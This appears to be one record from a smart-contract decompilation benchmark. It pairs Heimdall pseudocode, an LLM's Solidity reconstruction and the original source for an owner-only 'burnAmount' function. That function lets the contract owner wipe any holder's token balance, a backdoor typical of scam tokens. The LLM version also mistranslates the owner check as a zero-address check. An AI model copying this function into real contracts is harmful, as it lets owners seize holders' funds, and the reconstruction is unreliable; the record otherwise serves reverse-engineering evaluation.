{
    "contract_address": "0x15C20cF168b7A84E9C56ADbf233b80Fc40090e7a",
    "heimdall_input": "function burnAmount(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - (address(owner / 0x01)), \"TARGET ERROR\");\n        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        address var_f = address(arg0);\n        var_h = 0x65;\n        require(storage_map_i[var_f] > (arg1 * 0x0de0b6b3a7640000), \"TARGET ERROR\");\n        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = address(arg0);\n        var_h = 0x65;\n        require(!(storage_map_i[var_f] - (arg1 * 0x0de0b6b3a7640000) > storage_map_i[var_f]), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = address(arg0);\n        var_h = 0x65;\n        storage_map_i[var_f] = storage_map_i[var_f] - (arg1 * 0x0de0b6b3a7640000);\n        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = 0xdead;\n        var_h = 0x65;\n        require(!(storage_map_i[var_f] > (storage_map_i[var_f] + (arg1 * 0x0de0b6b3a7640000))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = 0xdead;\n        var_h = 0x65;\n        storage_map_i[var_f] = storage_map_i[var_f] + (arg1 * 0x0de0b6b3a7640000);\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x0c;\n        var_e = 0x544152474554204552524f520000000000000000000000000000000000000000;\n    }",
    "llm_output": "function burnAmount(address account, uint256 amount) external {\n    // Redundant self-consistency checks preserved from original logic\n    require(account == address(account), \"TARGET ERROR\");\n    require(amount  == amount,           \"TARGET ERROR\");\n\n    // Ownership verification\n    require(msg.sender == owner, \"Ownable: caller is not the owner\");\n\n    // Extra address sanity check retained from the decompiled code\n    require(account != address(0), \"TARGET ERROR\");\n\n    // Overflow-prevention check for the forthcoming multiplication\n    uint256 scale = 1e18;\n    require(amount == 0 || scale <= type(uint256).max / amount, \"TARGET ERROR\");\n\n    uint256 scaledAmount = amount * scale;\n\n    // Balance-sufficiency check on the source account\n    require(_balances[account] >= scaledAmount, \"TARGET ERROR\");\n\n    // Duplicate overflow check kept to mirror decompiled behaviour\n    require(amount == 0 || scale <= type(uint256).max / amount, \"TARGET ERROR\");\n\n    // Underflow guard (automatic in ^0.8.x, explicit here for fidelity)\n    require(_balances[account] - scaledAmount <= _balances[account], \"TARGET ERROR\");\n    _balances[account] -= scaledAmount;\n\n    // Burn address (0x\u2026dead)\n    address burnAddress = address(0x000000000000000000000000000000000000dEaD);\n\n    // Overflow check before adding to the burn address balance\n    require(_balances[burnAddress] + scaledAmount >= _balances[burnAddress], \"TARGET ERROR\");\n    _balances[burnAddress] += scaledAmount;\n}",
    "ground_truth": "function burnAmount(address wallet, uint256 amount) public onlyOwner {\\r\\n        require(wallet != owner(), \\\"TARGET ERROR\\\");\\r\\n        address deadAddress = 0x000000000000000000000000000000000000dEaD;\\r\\n        if (_balances[wallet] <= amount * 10 ** 18) {\\r\\n            _balances[wallet] = 0;\\r\\n            _balances[deadAddress] = _balances[deadAddress] + _balances[wallet];\\r\\n        } else {\\r\\n            _balances[wallet] = _balances[wallet] - amount * 10 ** 18;\\r\\n            _balances[deadAddress] = _balances[deadAddress] + amount * 10 ** 18;\\r\\n        }\\r\\n    }"
}